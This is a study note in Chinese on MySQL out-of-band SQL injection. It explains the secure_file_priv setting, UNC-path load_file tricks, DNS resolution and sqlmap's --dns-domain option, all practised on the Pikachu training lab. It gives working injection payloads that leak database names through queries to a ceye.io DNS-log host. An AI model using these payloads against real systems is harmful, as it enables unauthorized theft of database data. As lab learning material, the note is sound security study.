# SQL OOB以及sqlmap OOB



### mysql 的my.ini設置
```
D:\phpstudy_pro\Extensions\MySQL5.7.26\my.ini
```

### 查詢 secure_file_priv 
```
SHOW VARIABLES LIKE 'secure_file_priv';
```


* 将secure_file_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）


### 找到[mysqld]並加入

```
secure_file_priv = 
或是
secure_file_priv = ""
```



* load_file函数任意加載檔案，需要設定secure_file_priv

* load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。


## ceye.io
* 這是一個測試帶外的平台
* 另外此次漏洞平台為pikachu的時間盲打


```
select load_file( concat('\\\\',database(),'.xxxxx.ceye.io\\abc') )
```
### DNS LOG 出現記錄
```

piKAChu.xxxxx.cEye.io
```

### 加上 hex 編碼特殊字串
```
select load_file( concat('\\\\',hex(database()),'.xxxxx.ceye.io\\abc') )
```

```
DNS LOG 出現
70696b61636875.xxxxx.cEYE.IO
```


## 實戰:


### Pikachu 時間盲注 的SQL語句
```
select id,email from member where username='$name'"
```



### 所以要構造成這樣

```
lili' UNION select 1,load_file( concat('\\\\',database(),'.9buxpd.ceye.io\\abc') ) #


lili' UNION select 1,load_file( concat('\\\\',hex(database()),'.9buxpd.ceye.io\\abc') ) #

```







## 以下是比較麻煩的DNS LOG + sqlmap

### 複習 DNS 查詢:
我有網域 www.123.com 假設開放web 服務假設NS 為ns.1est  A記錄為 1.1.1.1 DNS 路遊是怎麼找到 1.1.1.1的，最後是如何跟 1.1.1.1進行http 通信




```
**域名解析过程：**

1. **本地缓存查找：** 首先，操作系统会检查本地的DNS缓存，看是否已经有这个域名的解析记录。如果有，就直接返回对应的IP地址。

2. **本地DNS服务器：** 如果本地缓存中没有对应的记录，操作系统会向配置的本地DNS服务器发送查询请求。

3. **递归查询：** 本地DNS服务器会从根域名服务器开始逐级查询，直到找到负责该域的权威域名服务器。在这个例子中，假设"ns.1est"是负责"123.com"的权威域名服务器。

4. **权威域名服务器：** 本地DNS服务器会向权威域名服务器发送查询请求，询问"www.123.com"的IP地址。

5. **A记录返回：** 如果权威域名服务器正确配置了"www.123.com"的A记录为"1.1.1.1"，那么它会返回这个IP地址作为解析结果。

6. **本地DNS服务器缓存：** 本地DNS服务器将获取到的解析结果（1.1.1.1）保存在缓存中，以备将来的查询使用。

7. **操作系统返回：** 最后，操作系统将IP地址（1.1.1.1）返回给发起解析请求的应用程序，比如浏览器。

**HTTP通信过程：**

1. **建立TCP连接：** 浏览器通过操作系统发起到IP地址1.1.1.1的TCP连接，使用HTTP协议的默认端口80。这是通过操作系统和网络协议来完成的，包括三次握手等步骤。

2. **发起HTTP请求：** 一旦TCP连接建立，浏览器会构造一个HTTP请求，其中包括请求行（GET / HTTP/1.1）、头部信息等。浏览器会发送这个请求给1.1.1.1。

3. **Web服务器处理请求：** 位于1.1.1.1的Web服务器（假设您在该IP上有开放的Web服务）收到请求后，会解析请求并找到请求的资源（比如网页文件）。

4. **发送HTTP响应：** Web服务器会生成一个HTTP响应，包括状态行（HTTP/1.1 200 OK）、响应头部、以及请求的资源内容。这个响应会被发送回发起请求的浏览器。

5. **浏览器解析响应：** 浏览器收到响应后，会根据响应头部的信息处理响应内容，比如将HTML内容解析为网页并渲染显示。

6. **关闭TCP连接：** 一旦HTTP响应处理完成，TCP连接会被关闭，释放资源。

综上所述，DNS解析将域名映射到IP地址，然后HTTP通信通过建立TCP连接、发送请求和接收响应的过程来实现与Web服务器的交互。
```

### VPS設置為NS服務器

* 我有網域 123.com 假設開放web 服務假設NS 為ns.1est  A記錄為 1.1.1.1  我在1.1.1.1的VPS 上自定義一個NS

* 那麼我自定義NS 1.1.1.1上面記錄了
aaaa.123.com A記錄對應到 2.2.2.2

我如果ping aaaa.123.com 最後會去請求2.2.2.2嗎?



```
如果您在1.1.1.1的VPS上设置了一个自定义的NS记录，将"aaaa.123.com"的A记录指向"2.2.2.2"，那么在一般情况下，DNS解析和ping的过程会是这样的：

1. 您的计算机发起一个DNS查询请求，要求解析"aaaa.123.com"的IP地址。
2. 该DNS查询请求将被路由到您配置的权威DNS服务器，即1.1.1.1的VPS。
3. 在您的权威DNS服务器上，根据您的自定义记录，服务器会返回"aaaa.123.com"对应的IP地址为"2.2.2.2"。
4. 您的计算机收到来自权威DNS服务器的响应，其中包含了IP地址"2.2.2.2"。
5. 您的计算机尝试使用ICMP协议（ping）来连接IP地址"2.2.2.2"，这将在网络上寻找具有这个IP地址的主机，以便进行通信。

在这种情况下，DNS解析返回的IP地址是"2.2.2.2"，您的计算机会尝试与该IP地址建立网络连接，这就是ping的过程。需要注意的是，您必须确保"2.2.2.2"是一个可访问的主机，以便ping操作能够成功。

总结而言，如果您在权威DNS服务器上将"aaaa.123.com"的A记录设置为"2.2.2.2"，那么ping操作会尝试与"2.2.2.2"建立连接。
```


### sqlmap --dns-domain 選項  就是在VPS在自定義一個 NS 服務器，然後只會返回127.0.0.1

* sqlmap --dns-domain 會創建一個DNS接析服務，只解析到127.0.0.1

如果您在1.1.1.1的VPS上设置了一个自定义的NS记录，将"aaaa.123.com"的A记录指向"127.0.0.1"，那么在一般情况下，DNS解析和ping的过程会是这样的：

```
1. 目標受害網站计算机发起一个DNS查询请求，要求解析"aaaa.123.com"的IP地址。
2. 该DNS查询请求将被路由到您配置的权威DNS服务器，即1.1.1.1(攻擊者)的VPS。
3. 在您的VPS DNS服务器上，根据您的自定义记录，服务器会返回"aaaa.123.com"对应的IP地址为"127.0.0.1"。
4. 目標受害網站收到来自VPS上NS服务器的响应，其中包含了IP地址"127.0.0.1"。


至於大概會出怎樣的DNS請求我也沒特別研究不過以下是我的想像(有空抓包看看):

(database_name).aaaa.123.com 都返回127.0.0.1

(table_name).aaaa.123.com 都返回127.0.0.1
```


## 最後圖解

### DNS解析過程
![DNS接析](https://hackmd.io/_uploads/S14PqfDhh.png)


### vps上裝 sqlmap

![vps上裝 sqlmap](https://hackmd.io/_uploads/HJNT5MPn2.png)






## 資源:

手把手带你利用SQLmap结合OOB技术实现音速盲注.pdf
https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/books/%E6%89%8B%E6%8A%8A%E6%89%8B%E5%B8%A6%E4%BD%A0%E5%88%A9%E7%94%A8SQLmap%E7%BB%93%E5%90%88OOB%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E9%9F%B3%E9%80%9F%E7%9B%B2%E6%B3%A8.pdf


dns-exfiltration-using-sqlmap.PDF (關鍵字) 
https://baixardoc.com/download/dns-exfiltration-using-sqlmap-5ceeebcad5c38?hash=9522c71a89b7dc5aa00e99757709b012



